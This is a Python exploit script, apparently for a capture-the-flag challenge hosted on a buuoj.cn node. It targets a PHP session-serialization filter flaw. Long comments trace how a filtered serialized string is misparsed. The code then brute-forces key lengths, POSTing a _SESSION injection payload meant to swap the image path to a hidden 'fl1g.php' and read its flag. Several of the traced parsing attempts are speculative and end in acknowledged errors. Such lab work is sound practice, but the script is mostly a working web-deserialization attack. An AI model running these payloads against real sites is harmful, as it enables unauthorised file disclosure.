import requests
import time
import base64

url = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/index.php"

session = requests.Session()

target = "fl1g.php"
target_b64 = base64.b64encode(target.encode()).decode()

print(f"Target: {target}, Base64: {target_b64}")

# Let me try the KEY NAME ESCAPE approach
# 
# The hint says:
# "通过 POST `_SESSION[flagphp]=xxx` 添加一个新的 SESSION 键"
# 
# So we POST: _SESSION[flagphp]=xxx
# 
# The session becomes: {user: guest, function: show_image, img: base64(guest_img.png), flagphp: xxx}
# 
# Serialized: a:4:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";s:7:"flagphp";s:N:"xxx";}
# 
# After filter: a:4:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";s:7:"";s:N:"xxx";}
# 
# PHP reads:
# a:4:{ - array with 4 elements
# s:4:"user" - key 1
# s:5:"guest" - value 1
# s:8:"function" - key 2
# s:10:"show_image" - value 2
# s:3:"img" - key 3
# s:20:"Z3Vlc3RfaW1nLnBuZw==" - value 3
# s:7:"" - key 4 (empty string, but length says 7)
#   PHP reads 7 bytes from "" (empty)
#   Content after "": ";s:N:"xxx";}
#   PHP reads 7 bytes: ";s:N:" (7 bytes, where N is the length of xxx)
#   
#   KEY NAME = ";s:N:"
#   
#   Then PHP expects KEY VALUE.
#   Next chars: "xxx";}
#   
#   PHP reads: " (opening quote)
#   Then reads VALUE content: xxx
#   Then reads "; (closing quote and semicolon)
#   Then reads } (end of array)
#   
#   So the VALUE is: xxx

# This doesn't inject a new img key!

# Let me think about this differently.
# 
# The key insight: we want to inject a new img key-value pair.
# 
# The injection should be: ";s:3:"img";s:9:"ZmwxZy5waHA=";}
# 
# This injection:
# - " closes the current VALUE
# - ; separates KEY and VALUE
# - s:3:"img" is the new KEY
# - ; separates KEY and VALUE
# - s:9:"ZmwxZy5waHA=" is the new VALUE
# - "; closes the VALUE
# - } closes the array

# For this to work, the injection needs to be parsed as separate elements!

# Let me trace through with a specific key name:
# 
# key_name = "flagflagflagflag" (16 bytes, 4 'flag's)
# inject = ";s:3:"img";s:9:"ZmwxZy5waHA=";} (31 bytes)
# 
# Serialized: s:16:"flagflagflagflag";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# After filter: s:16:"";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 16 bytes from "" (empty).
# Content after "": ";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 16 bytes: ";s:31:";s:3:"im (16 bytes)
# KEY NAME = ";s:31:";s:3:"im
# 
# Then PHP expects KEY VALUE.
# Next chars: g";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads: g (not a valid serialized type!)
# Error!

# So the key name escape doesn't work as expected!

# Let me try a different approach:
# What if we use the key name to inject content that forms a valid KEY?

# For example:
# key_name = "flag" + ";s:3:"img" (but this has quotes!)
# 
# Actually, the key name can't contain quotes directly.

# Let me try yet another approach:
# What if we use the VALUE to inject the key?

# POST _SESSION[flag]=;s:3:"img";s:9:"ZmwxZy5waHA=";}
# 
# key_name = "flag" (4 bytes)
# inject = ";s:3:"img";s:9:"ZmwxZy5waHA=";} (31 bytes)
# 
# Serialized: s:4:"flag";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# After filter: s:4:"";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 4 bytes from "" (empty).
# Content after "": ";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 4 bytes: ";s: (4 bytes)
# KEY NAME = ";s:
# 
# Then PHP expects KEY VALUE.
# Next chars: 31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads: 31 (length indicator)
# 
# Hmm, this doesn't work because 31 is not a valid serialized type!

# Let me try with more 'flag's:
# 
# key_name = "flagflagflagflag" (16 bytes)
# inject = ";s:3:"img";s:9:"ZmwxZy5waHA=";} (31 bytes)
# 
# Serialized: s:16:"flagflagflagflag";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# After filter: s:16:"";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 16 bytes from "" (empty).
# Content after "": ";s:31:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 16 bytes: ";s:31:";s:3:"im (16 bytes)
# KEY NAME = ";s:31:";s:3:"im
# 
# Then PHP expects KEY VALUE.
# Next chars: g";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads: g (not a valid serialized type!)
# Error!

# I think the issue is that the KEY NAME format is wrong.
# 
# A valid KEY format is: s:N:"key_name";
# 
# But the escaped content is: ";s:31:";s:3:"im
# 
# This is not a valid KEY format!

# Let me think about what we need:
# 
# We want the escaped content to form a valid KEY.
# 
# The escaped content is: ";s:N:"inject
# 
# If we can make this a valid KEY, then PHP would parse it correctly.

# Actually, let me just test different key name lengths and see what happens.

inject = ';s:3:"img";s:9:"' + target_b64 + '";}'

for n in range(1, 20):
    key_name = "flag" * n
    data = {f"_SESSION[{key_name}]": inject}
    r = session.post(url + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

